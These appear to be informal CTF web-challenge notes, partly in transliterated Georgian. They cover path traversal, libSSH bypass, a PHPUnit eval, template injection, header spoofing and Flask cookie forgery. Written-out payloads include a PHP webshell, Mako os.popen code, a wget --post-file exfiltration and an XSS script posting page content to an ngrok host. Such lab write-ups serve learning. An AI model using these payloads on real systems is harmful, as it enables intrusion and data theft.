Bolt - path traversal vulnerability as know as direct traversal attack allows hackers to open files they dont have access of 
1. view page saurce ( its written on bolt)
2. url/bolt
3. admin – password
4. file management – create file.txt enter - <?php echo system($_GET['cmd']);?>
5. rename flag.txt to file.php go to file
6. (url)php?cmd=ls -l
7. php?cmd=cat /flag.txt

Elastic ? - directory traversal is know as directory climbing it is caused because of http it help hackers to access not allowed directories
1. searchsploit elasticsearch 
ElasticSearch < 1.4.5 / < 1.5.2 - Directory Traversal (this sucks as well) cve-2015 5531
2. python exploit_elastic.py (link) /etc/passwd

Libssh - libSSH vulnerability (it allows attackers to access server without passwords )
1. searchsploit libssh
2. searchsploit -m linux/remote/... libSSH - Authentication Bypass (but saddly this sucks) cve 2018 10993
3. python3 file 34.141.12.127 31367 "cd ..;cat flag.txt"

Php unit - path traversal it helps hackers to read arbitrary files in the server 
1. $./dirsearch.py -u http://34.141.12.127:32017 -w ./db/dicc.txt
1. dirsearch -u url 
2. url /composer.json in here there is version of phpunit vulnerability 
3. /eval-stding.php // this is the one we are going to use for buirp suit
4. <?php system('cat /flag.txt')?>

Non-diff backdoor
1. Dirsearch -u url (Backup.zip) now we are going to search for backdoor this is written in php so lets find function which is written in php
2. Wget url/backup.zip lets download backup
3. cd backup 
4. Grep -r “shell_exec(“ //we will find function which says to us that we can use parameter welldone=knock to execute parameter shazam=injection
5. url?welldone=knockknock&shazam=id 
6. =cat flag.php
7. View page source

Shark - Vulnerability - Server Site Template Injection is when hacker can inject malicous code in web apps server template and than it might be executed which is bad for security
1. ${7*7} this is one of the template engines mathematical one to know if it has vulnerability 
curl -I (url) from here we can tell that servers is in werkzeug it has python version 3.6.9 and also has Server site template injection
2. Open burp browser i have to input something to trigger than that command last one
3. Submit something 
4. Name= 
<%
import os
x=os.popen(‘cat flag’).read()
%>
${x}
5. Send to Repeater

address
roca websitze shevalt source codshi  iqneba /admin.php mwvaned
mivuwert https://url/admin.php
mere gadavkopirebt mtlianad da gavaketebt curl commands
ambobs rom mxolod local userebs sheudzliat naxva
amitom chven unda movatyuot da gavaketot spoofing X-forward-for header -is gamoyenebit

curl -XGET http:// url /admin.php -H 'X-Forwarded-For: 127.0.0.1'
sadac -H headeria

alien
When we first access the challenge we will see the source code. 
We can now send the flag.php value as POST start parameter through "guessing". 
curl is a cmd line tool for transferring data with URL 
And we get the flag by using curl 'ip/?start=' --data 'start=flag.php'
--data gives us info from the request and inside the start parameter, we can put name of flag 

auth
let's run dirsearch
we have a few amount of directories, let's check each of them
method not allowed on /auth. Let's change it by using burpsuite
we got username and password liens and now we know that those 2 are json format
let's get those username and password from another directory
username: admin password:admin
we got username/password but do not have jwt token
let's try to auth with our username/password

Content-Length: 47
Content-type:application/json

{
	"username":"admin",
	"password":"admin"
}

we got our access token
now let's write in secrets

Content-type" application/json
Authorization: JWT

[token]

downloader
after accessing the webpage, we see url downloader 
we can try putting something basic to check what happens
as we insert a link, some kind of code popped up
the website is built on php and it uses wget  
so we can try using wget functions to extract a possible file
since its not enough to only use wget
we try requestbin/postbin/requestinspector (to receive packets/files)
--post-file '/var/www/html/flag.php'

framable
<script>
var exfil = document.getElementsByTagName("body")[0].innerHTML;
window.location.href="https://c3d9707d386e.ngrok.io?pgsrc=" + btoa(exfil);
</script>

web-intro
Challenge description : Are you an admin?
We are given an address to connect to the website : 35.246.158.241:31589. 
When entering the website we see this messages saying Access Denied

Looking at the source code we can’t see anything. But if we look at the cookies we can see our session.

Taking the value to jwt.io to decode it , we get the following :

{"logged_in": false}

As we can see We are dealing with Flask Session Cookies , so I googled some “flask cheat sheet hacktricks”
I got this amazing article which cover the Flask Session Cookies https://book.hacktricks.xyz/pentesting/pentesting-web/flask .
Following this article , first thing we gonna do is decoding the cookie using the following command flask-unsign --decode --cookie
'eyJsb2dnZWRfaW4iOmZhbHNlfQ.Yg9geQ.s8MKSRemMQyS5S60QTS0lY0Xg0o’ by doing that We get the following output ( like jwt.io earlier ) Untitled4

Now we need to bruteforce the secret which was used to sign the original cookie and for this we gonna use this command : flask-unsign
--unsign --cookie < cookie.txt where cookie.txt is the file containing our cookie. [ We can also use this command : flask-unsign --unsign --server <target> ]

Untitled5

Quickly we get our secret key which is password . Now all we need to do is signing the cookie with the secret password but we need to change 
the {"logged_in": false} to {"logged_in": True} .
So the command will be : flask-unsign --sign --cookie "{'logged_in': True}" --secret 'password'
After doing that we get our new cookie.

Am using a cool chrome extension called EditThisCookie . Simply paste the value there and hit the green thingy.

Refresh the page and theeereeeee We go!! We got our flag

flag : CTF{66bf8ba5c3ee2bd230f5cc2de57c1f09f471de8833eae3ff7566da21eb141eb7}